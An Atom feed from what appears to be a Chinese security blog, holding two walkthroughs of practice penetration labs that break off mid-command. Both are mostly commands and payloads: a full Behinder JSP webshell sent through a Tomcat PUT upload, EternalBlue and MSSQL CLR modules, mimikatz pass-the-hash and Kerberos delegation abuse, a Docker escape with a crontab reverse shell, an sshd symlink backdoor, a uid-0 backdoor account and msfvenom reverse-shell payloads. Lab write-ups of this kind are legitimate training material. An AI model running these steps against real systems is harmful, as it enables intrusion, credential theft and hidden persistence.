<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A.binのBlog</title>
  
  
  <link href="https://blog.abinix.top/atom.xml" rel="self"/>
  
  <link href="https://blog.abinix.top/"/>
  <updated>2022-01-17T18:37:51.824Z</updated>
  <id>https://blog.abinix.top/</id>
  
  <author>
    <name>A.bin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Redteam靶场渗透</title>
    <link href="https://blog.abinix.top/2022/01/18/Redteam%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://blog.abinix.top/2022/01/18/Redteam%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</id>
    <published>2022-01-17T18:36:25.000Z</published>
    <updated>2022-01-17T18:37:51.824Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Redteam靶场渗透"><a href="#Redteam靶场渗透" class="headerlink" title="Redteam靶场渗透"></a>Redteam靶场渗透</h1><p>来自渗透攻击红队的靶场</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224194013.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到目标ip，访问80端口无果，上nmap</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223235551.png"></p><p>开放7001端口</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223235611.png"></p><p>weblogic框架</p><p>工具扫出漏洞，权限为administrator</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223235701.png"></p><p>查看杀软</p><p><code>tasklist /svc</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223235805.png"></p><p>无杀软</p><p>不存在域</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224125608.png"></p><h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p>发现存在weblogic弱口令，weblogic/weblogic123打算上传一个war包维持权限</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224095122.png"></p><p>点击部署，将冰蝎马子传上去</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224095656.png"></p><p>冰蝎连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224095736.png"></p><h2 id="上线第一台主机"><a href="#上线第一台主机" class="headerlink" title="上线第一台主机"></a>上线第一台主机</h2><p>目标在内网，选择http代理，将本机http代理出去</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224144226.png"></p><p>cs设置代理，并制作木马</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224144326.png"></p><p>成功上线第一台</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224144341.png"></p><h3 id="第一台内网信息收集"><a href="#第一台内网信息收集" class="headerlink" title="第一台内网信息收集"></a>第一台内网信息收集</h3><p>ipconfig，存在两张网卡</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224144428.png"></p><p>抓密码，但没抓到明文</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224144944.png"></p><p>端口扫描</p><p>扫描10.10.20网段发现还有一台机器 <strong>10.10.20.7</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224153145.png"></p><p>尝试打一下<strong>MS17010</strong></p><h3 id="cs派生shell"><a href="#cs派生shell" class="headerlink" title="cs派生shell"></a>cs派生shell</h3><p>kali开启frp</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224151053.png"></p><p>cs设置一个http的监听</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224151113.png"></p><p>msf设置监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lhost </span><br><span class="line">set lport </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>cs中点击spawn</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224153154.png"></p><p>收到会话</p><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add 10.10.20.0 255.255.255.0 1</span><br><span class="line">route print</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224153849.png"></p><p>成功添加路由</p><h2 id="MS17010攻击"><a href="#MS17010攻击" class="headerlink" title="MS17010攻击"></a>MS17010攻击</h2><p>msf中设置payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set rhost 10.10.20.7</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>稍等一会变拿到shell</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224154724.png"></p><p>麻了，这里第一次run时，没有弹shell，第二次就可以了</p><h3 id="转发会话"><a href="#转发会话" class="headerlink" title="转发会话"></a>转发会话</h3><p>关闭防火墙，怕影响后续操作，先关了吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofile state</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224162515.png"></p><p>退出全局模式，使用<strong>inject模板 注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set LHOST  &#x2F;&#x2F;cs主机地址</span><br><span class="line">set LPORT  &#x2F;&#x2F;随意设置监听端口，需要和cs保持一致</span><br><span class="line">set session 2 &#x2F;&#x2F;设置需要派送的meterpreter</span><br><span class="line">set DisablePayloadHandler true &#x2F;&#x2F;禁止产生一个新的handler</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226203441.png"></p><p>打了一圈，发现并不成功，后来想到可能<strong>不出网</strong>，于是换一种思路</p><h3 id="上线第二台机器"><a href="#上线第二台机器" class="headerlink" title="上线第二台机器"></a>上线第二台机器</h3><p>利用web机做一个中转监听</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224162356.png"></p><p>生成木马，并上传至目标机</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224162803.png"></p><p>运行马子，成功上线第二台</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224162929.png"></p><h2 id="域环境信息收集"><a href="#域环境信息收集" class="headerlink" title="域环境信息收集"></a>域环境信息收集</h2><p><code>ipconfig</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224163139.png"></p><p>发现新的网段为<strong>10.10.10.7</strong></p><p>发现存在域环境</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226120124.png"></p><p>查看域内成员</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226120301.png"></p><p>还有两个成员，一个是<strong>owa</strong>猜测是域控，另一个为<strong>sqlserver</strong></p><p>ping owa得到域控地址 <strong>10.10.10.8</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226120540.png"></p><h2 id="域内渗透"><a href="#域内渗透" class="headerlink" title="域内渗透"></a>域内渗透</h2><p>决定先上传一个fscan进行内网扫描</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226121351.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Windows\fscan.exe -h 10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226121641.png"></p><p>扫到了mssql的弱口令，并且证实了owa为域控</p><h3 id="添加路由-1"><a href="#添加路由-1" class="headerlink" title="添加路由"></a>添加路由</h3><p>添加一条去域控的路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add 10.10.10.0 255.255.255.0 3</span><br><span class="line">route print</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226122037.png"></p><p><strong>尝试使用clr进行攻击</strong>，msf中设置模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_clr_payload</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set password sa</span><br><span class="line">set lhost 10.10.10.7</span><br><span class="line">set rhost 10.10.10.18</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>这里第一次成功并拿到一个meterpreter，但后来断了，正准备写笔记的时候报错了，好像是端口关了，fscan也扫不出来1433端口，放一放</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226132821.png"></p><p>运维把靶场修好了哈哈哈</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226145148.png"></p><p>这回没问题了，拿到meterpreter</p><h3 id="上线域内主机"><a href="#上线域内主机" class="headerlink" title="上线域内主机"></a>上线域内主机</h3><p>以win7作为中转上线，并生成马子，meterpreter中上传</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226145436.png"></p><p>果然，权限太低，上传不了，也有可能是当前文件下没有权限传文件，于是打算fuzz能上传文件的目录</p><h3 id="连接mssql"><a href="#连接mssql" class="headerlink" title="连接mssql"></a>连接mssql</h3><p>利用账号密码，cs开启socks代理，连接sql server</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226150854.png"></p><p>在目录下fuzz能上传的地方</p><p>找到C:\Users\Public\</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226152000.png"></p><p>但是我一运行马子就掉，很奇怪，于是打算在msf中运行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226152154.png"></p><p>上线成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226152213.png"></p><h3 id="clr提权"><a href="#clr提权" class="headerlink" title="clr提权"></a>clr提权</h3><p>当前权限太低了，先给工具添加个代理</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226153232.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;SharpSQLTools.exe 10.10.10.18 sa sa master install_clr whoami</span><br><span class="line">.&#x2F;SharpSQLTools.exe 10.10.10.18 sa sa master enable_clr</span><br><span class="line">.&#x2F;SharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato whoami</span><br><span class="line">.&#x2F;SharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato C:&#x2F;Users&#x2F;Public&#x2F;zhuan2.exe </span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226154104.png"></p><p>成功提升到system权限，此时再次运行马子</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226174127.png"></p><p>成功上线system权限的sql server机器</p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>抓取到sql server密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226175426.png"></p><p>尝试使用hash传递的方式生成凭证，后访问域控，但是失败了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth &#x2F;domain:redteam.red &#x2F;user:sqlserver &#x2F;ntlm:6a59bf65a4957ac67e5fb4e1c221939c</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226175753.png"></p><h2 id="域内委派攻击"><a href="#域内委派攻击" class="headerlink" title="域内委派攻击"></a>域内委派攻击</h2><h3 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h3><p>域委派是指将域内用户的权限委派给服务账号，使得<strong>服务账号</strong>能以用户的权限在域内展开活动，域委派分为<strong>约束委派</strong>，<strong>非约束委派</strong>，<strong>基于资源的约束委派</strong>。</p><blockquote><p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MSSQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p></blockquote><p>例子：当 A 访问服务账号 B 时，服务账号 B 拿着 A 用户的凭证去访问服务 C，这个过程称为委派。</p><h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><blockquote><p>约束委派只能获取每个主机服务的 ST，所以只能<strong>模拟用户访问特定的服务</strong>，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者NTLM Hash，我们就可以伪造S4U请求，进而伪装成服务用户以任意账户的权限申请访问某服务的ST</p></blockquote><h3 id="寻找约束委派"><a href="#寻找约束委派" class="headerlink" title="寻找约束委派"></a>寻找约束委派</h3><p>使用AdFind工具寻找域内存在约束委派的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\AdFind.exe -h 10.10.10.8 -u sqlserver -up Server12345 -b &quot;DC&#x3D;redteam,DC&#x3D;red&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226180908.png"></p><p>找到sqlserver是一个约束委派用户</p><h3 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h3><p>利用 kekeo 请求该用户的 TGT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Users\Public\kekeo.exe &quot;tgt::ask &#x2F;user:sqlserver &#x2F;domain:redteam.red &#x2F;password:Server12345 &#x2F;ticket:administrator.kirbi&quot;</span><br></pre></td></tr></table></figure><p>麻了，一直报错</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226185653.png"></p><p>但是票据已经生成了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226185722.png"></p><p>使用这张票据去请求域管的ST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u &#x2F;tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi &#x2F;user:Administrator@redteam.red &#x2F;service:cifs&#x2F;owa.redteam.red&quot;</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226190107.png"></p><p>使用mimikatz注入票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226190219.png"></p><p>访问域控共享文件夹</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226190345.png"></p><p>成功</p><h3 id="上线域控"><a href="#上线域控" class="headerlink" title="上线域控"></a>上线域控</h3><p>准备上线域控的时候又掉了。。。</p><p>先创建一个SMB正向监听，然后计划任务，link域控上线</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226201754.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226201809.png"></p><p>至此，全部机器上线完毕，渗透结束</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211226202119.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Redteam靶场渗透&quot;&gt;&lt;a href=&quot;#Redteam靶场渗透&quot; class=&quot;headerlink&quot; title=&quot;Redteam靶场渗透&quot;&gt;&lt;/a&gt;Redteam靶场渗透&lt;/h1&gt;&lt;p&gt;来自渗透攻击红队的靶场&lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="-渗透" scheme="https://blog.abinix.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场四</title>
    <link href="https://blog.abinix.top/2022/01/18/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E5%9B%9B/"/>
    <id>https://blog.abinix.top/2022/01/18/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E5%9B%9B/</id>
    <published>2022-01-17T18:34:04.000Z</published>
    <updated>2022-01-17T18:36:13.491Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ATT-amp-CK红队评估实战靶场四"><a href="#ATT-amp-CK红队评估实战靶场四" class="headerlink" title="ATT&amp;CK红队评估实战靶场四"></a>ATT&amp;CK红队评估实战靶场四</h1><p>靶场下载：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><p><strong>网络拓扑图：</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220108235057.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali: 192.168.157.129</span><br><span class="line"></span><br><span class="line">ubuntu： 192.168.157.130 &#x2F; 192.168.183.129</span><br><span class="line"></span><br><span class="line">win7(域成员)：192.168.183.131</span><br><span class="line"></span><br><span class="line">DC： 192.168.183.132</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使得攻击机kali能ping通web机ubuntu，且win7能ping通域控DC即可</p><p>环境是在Ubuntu上用docker做的，需要手动启动docker容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start ec 17 09 bb da 3d ab ad</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113010832.png"></p><p>docker ps查看发现均已开启</p><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>nmap常规扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -P0 192.168.157.128</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113010925.png"></p><p>查看2001端口为一个上传页面，buu刷过题，很像s2漏洞的靶场</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113011220.png"></p><p>2002端口为tomcat界面</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113011244.png"></p><p>2003端口为phpmyadmin页面</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113011302.png"></p><p>那么getshell方式有许多了，直接上s2漏扫</p><h2 id="get-webshell"><a href="#get-webshell" class="headerlink" title="get webshell"></a>get webshell</h2><h3 id="S2-045-getshell"><a href="#S2-045-getshell" class="headerlink" title="S2-045 getshell"></a>S2-045 getshell</h3><p>通过s2漏洞得到root权限</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113011612.png"></p><h3 id="tomcat任意文件写入getshell"><a href="#tomcat任意文件写入getshell" class="headerlink" title="tomcat任意文件写入getshell"></a>tomcat任意文件写入getshell</h3><p><strong>CVE-2017-12615</strong> 将get请求改成put，传入马子即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113012844.png"></p><p>上传一个冰蝎马</p><p>完整请求包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;abin.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.157.128:2002</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;96.0.4664.110 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,zh-TW;q&#x3D;0.8,en-US;q&#x3D;0.7,en;q&#x3D;0.6,zh-HK;q&#x3D;0.5</span><br><span class="line">Cookie: pma_lang&#x3D;zh_CN; JSESSIONID&#x3D;1amx4f9rqaxt5pjiqakj6epn5; phpMyAdmin&#x3D;41eae42372d0270a264bb8bb47a4d7d4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k&#x3D;&quot;e45e329feb5d925b&quot;;&#x2F;*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*&#x2F;session.putValue(&quot;u&quot;,k);Cipher c&#x3D;Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113013025.png"></p><h3 id="phpmyadmin-4-8-1-getshell"><a href="#phpmyadmin-4-8-1-getshell" class="headerlink" title="phpmyadmin 4.8.1 getshell"></a>phpmyadmin 4.8.1 getshell</h3><h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><p>拿下shell后发现是docker环境下的一个shell，需要docker逃逸拿到改主机真实shell</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113013840.png"></p><p>判断是否为docker环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -alh &#x2F;.dockerenv</span><br><span class="line">cat &#x2F;proc&#x2F;1&#x2F;cgroup</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220113014001.png"></p><h3 id="特权模式docker逃逸"><a href="#特权模式docker逃逸" class="headerlink" title="特权模式docker逃逸"></a>特权模式docker逃逸</h3><p>如果是通过特权模式启动容器，就可以获得大量设备文件的访问权限，因为管理员执行<code>docker run —privileged</code>时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p><p>创建一个文件夹，将宿主机根目录挂载至容器目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line">mkdir &#x2F;111</span><br><span class="line">mount&#x2F;dev&#x2F;sda1 &#x2F;111 #挂载目录 这时在docker环境下会有一个目录&#x2F;111，而这就是宿主机的目录</span><br></pre></td></tr></table></figure><h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><p>在挂载的 tmp 目录下写入一个反弹 shell 命令</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220115013847.png"></p><p>写计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;$a*&#x2F;1 *    * * *    root  bash &#x2F;tmp&#x2F;111.sh &#39;  &#x2F;111&#x2F;etc&#x2F;crontab #使得会弹的shell是以root用户</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;666&#x2F;etc&#x2F;crontab #查看计划任务</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220115014114.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 666 #攻击机设置监听</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220115014147.png"></p><p>回弹</p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>软连接后门的原理是利用了 PAM 配置文件的作用，将 sshd 文件软连接名称设置为 su，这样应用在启动过程中他会去 PAM 配置文件夹中寻找是否存在对应名称的配置信息（su），然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su #设置软连接</span><br><span class="line">&#x2F;tmp&#x2F;su -oPort&#x3D;6060 #连接端口为6060</span><br></pre></td></tr></table></figure><p>使用shh远程登陆，密码为<strong>任意密码</strong>，但用户为普通权限，还需要进一步操作</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220115014647.png"></p><h4 id="添加-uid-0-用户后门-root-组权限"><a href="#添加-uid-0-用户后门-root-组权限" class="headerlink" title="添加 uid 0 用户后门 root 组权限"></a>添加 uid 0 用户后门 root 组权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -p &#96;openssl passwd 123456&#96;  -o -u 0 abin #创建一个后门用户abin，权限为root</span><br></pre></td></tr></table></figure><p>这时使用<strong>su abin</strong>切换到abin用户</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220115015406.png"></p><p>如上图，成功登陆且权限为root</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h3><p>制作msf码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.157.129 LPORT&#x3D;9091 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220116003851.png"></p><p>上传至目标机器中，并赋予权限</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220116004238.png"></p><p>本地设置监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 